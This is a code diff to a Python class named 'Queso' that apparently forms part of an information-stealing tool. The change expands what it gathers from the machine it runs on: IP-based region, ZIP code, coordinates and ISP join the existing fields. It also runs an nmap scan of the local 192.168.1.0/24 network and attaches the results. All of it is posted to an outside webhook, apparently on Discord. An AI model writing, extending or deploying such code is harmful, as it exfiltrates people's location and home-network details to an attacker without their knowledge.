@@ -234,15 +234,19 @@ class Queso:
                 raise Exception("Failed to retrieve IP info")
             data = f"""
                 \nIP: {r['query']}
-                \nRegion: {r['regionName']}
                 \nCountry: {r['country']}
                 \nTimezone: {r['timezone']}
+                \nRegion: {r['regionName']}
+                \nZIP: {r['zip']}
+                \nCoordinates: [{r['lat']}, {r['lon']}]
+                \nISP: {r['isp']}
             """
         except Exception: # Throw an error if we can't
             ip_info = "(No IP info)"
         else:
             ip_info = data
 
+        # Create the embed
         payload = {
             "embeds": [
                 {
@@ -266,7 +270,7 @@ class Queso:
         # Append a network scan if we can make one
         networkscan = Network.NmapScan("192.168.1.1/24")
         if networkscan:
-            fields['file'] = ("{}.xml".format(os.getlogin()), ElementTree.tostring(networkscan))
+            fields['file'] = ("{}.xml".format(uuid), ElementTree.tostring(networkscan))
 
         fields['payload_json'] = json.dumps(payload).encode() # Append the embed
         http.request("POST", self.Webhook, fields= fields) # Bon voyage!
